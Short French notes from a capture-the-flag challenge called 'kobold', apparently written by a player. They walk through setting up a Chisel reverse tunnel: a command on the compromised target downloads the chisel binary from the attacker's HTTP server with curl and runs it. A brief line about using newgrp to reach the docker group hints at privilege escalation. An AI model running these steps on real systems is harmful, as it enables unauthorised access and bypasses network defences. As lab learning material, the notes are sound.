
voir le fonctionnement exact de newgrp pourquoi possibilite de passer sur le group docker sur le challenge kobold


doc sur Chisel
bash./chisel server --reverse --port 9001
Si tu l'as installé ailleurs :
bash# Trouver où il est
find / -name "chisel" 2>/dev/null


/chemin/vers/chisel server --reverse --port 9001

Dans un nouveau terminal, lance un serveur HTTP depuis le dossier où est chisel :

bashpython3 -m http.server 9999

3. Depuis ton shell MCP sur la cible, télécharge chisel
bashcurl http://10.10.16.105:9999/chisel -o /tmp/chisel
chmod +x /tmp/chisel

4. Lance le client depuis la cible
bash/tmp/chisel client 10.10.16.105:9001 R:8888:127.0.0.1:8888

5. Tu devrais voir sur ton serveur chisel
2026/06/03 23:49:xx server: session#1: Connected
Et ensuite accède à la cible sur le bon port



view-source:URL
